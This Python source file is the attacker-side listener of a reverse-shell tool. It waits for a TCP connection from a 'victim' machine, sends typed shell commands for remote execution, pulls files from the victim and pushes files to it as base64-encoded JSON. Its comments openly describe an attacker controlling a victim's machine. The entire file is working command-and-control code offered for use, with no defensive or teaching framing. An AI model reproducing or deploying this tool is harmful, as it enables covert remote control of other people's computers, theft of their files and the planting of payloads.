#!usr/bin/env python3
import base64
import socket
import sys
import json

class Listener:
    '''
    Creates a Listener which opens a port on the
    attackers machine through TCP socket.
    params: ip(str), port(int)
    '''
    def __init__(self, ip:str, port:int) -> None:    
        self.ip = ip 
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.ip,self.port))
        self.server.listen(0)
        print('[*] Server started and waiting for incoming connections.')

        self.connection, conn_addr = self.server.accept()
        print(f'[*] Incoming connection from {conn_addr}')


    def serial_send(self, data:str or list) :
        '''
        serialize data and send over TCP socket.
        '''
        if type(data) == bytes:
            data = str(data, encoding='utf-8')

        json_data = json.dumps(data)
        bytes_json_data = bytes(json_data, encoding='utf-8')
        # print('Listener sent: ',bytes_json_data)
        self.connection.send(bytes_json_data)


    def serial_receive(self) -> str :
        '''
        receive serialized data over TCP socket
        and retrieve original data.
        '''
        bytes_json_data = b''
        while True:
            try:
                bytes_json_data += self.connection.recv(1024)
                data = json.loads(bytes_json_data)
                # print('Listener Rec: ',data)
                return data
            except json.JSONDecodeError:
                continue


    def execute_remotely(self, command):
        '''
        execute command on the remote machine.
        '''
        self.serial_send(command)
        return self.serial_receive()


    def write_file(self, path, content):
        '''
        write downloaded contents from the victim 
        to the specified path file.
        '''
        with open(path, 'wb') as file:
            bytes_content = base64.b64decode(content)
            file.write(bytes_content)
            return (f'[*] File {path} Downloaded successfully.')


    def read_file(self, path):
        '''
		upload file contents to the victim's machine.
		'''
        with open(path, 'rb') as file:
            file_content = file.read()
            base64_file_content = base64.b64encode(file_content)
            return base64_file_content


    def run(self):
        '''
        start listener.
        '''
        while True:
            try:
                command = input('>> ')

                # create list and get commands with args
                command_lst = command.split(' ')
                command_list_len = len(command_lst)>=2
                cmd = command_lst[0]
                if command_list_len:
                    path = command_lst[1]
                
                if cmd == 'exit':
                    self.execute_remotely('exit')
                    self.connection.close()
                    sys.exit()

                elif cmd == 'download' and command_list_len:
                    contents = self.execute_remotely(command)
                    execution_result = self.write_file(path, contents)

                elif cmd == 'upload' and command_list_len:
                    print('[*] Listener : Uploading file to the victim machine.')
                    str_file_contents = str(self.read_file(path), encoding='utf-8')
                    command +=  ' ' + str_file_contents
                    # self.serial_send(command)
                    execution_result = self.execute_remotely(command)

                    
                else :
                    # print('[-] Listener else')
                    execution_result = self.execute_remotely(command)
                
                print(execution_result)

            except KeyboardInterrupt:
                print('[!] ctrl+c detected.')

            except IndexError:
                print('[!] Cannot Accept empty command.')

            except Exception as e:
                print('[-] Listener Exception : ', e)